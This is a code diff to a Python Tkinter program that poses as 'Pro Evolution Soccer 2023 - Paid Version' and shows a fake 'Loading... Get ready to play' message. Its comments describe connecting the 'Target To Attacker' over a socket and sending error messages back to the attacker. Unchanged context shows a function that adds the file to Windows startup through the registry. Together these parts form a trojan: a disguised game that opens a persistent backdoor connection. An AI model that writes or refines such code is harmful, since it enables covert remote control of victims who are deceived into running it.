@@ -19,6 +19,8 @@ import time
 
 root= tk.Tk()
 
+root.title("Pro Evolution Soccer 2023 - Paid Version")
+
 canvas1 = tk.Canvas(root, width = 300, height = 300)
 canvas1.pack()
 
@@ -42,13 +44,25 @@ def AddToStartup(f_name, path):
     # Closing 
     reg.CloseKey(open)
 
+def hello ():  
+    label1 = tk.Label(root, text= 'Loading,... Get ready to play in few minutes🤩', fg='green', font=('helvetica', 12, 'bold'))
+    canvas1.create_window(150, 200, window=label1)
+
 # Connecting Target To Attacker
 def connect():
     #Showing Button before proceeding
-    label1 = tk.Label(root, text= 'Loading,... Get ready to play in few miutes', fg='green', font=('helvetica', 12, 'bold'))
-    canvas1.create_window(150, 200, window=label1)
+    # label1 = tk.Label(root, text= 'Loading,... Get ready to play in few minutes', fg='green', font=('helvetica', 12, 'bold'))
+    # canvas1.create_window(150, 200, window=label1)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Put File In Startup
+    try:
+        hello()
+
+    # If Failed, Send Exception Message To Attacker
+    except Exception as e:
+        s.send(str(e).encode('utf-8'))
 
     # Try Until Not Connected
     connected = False
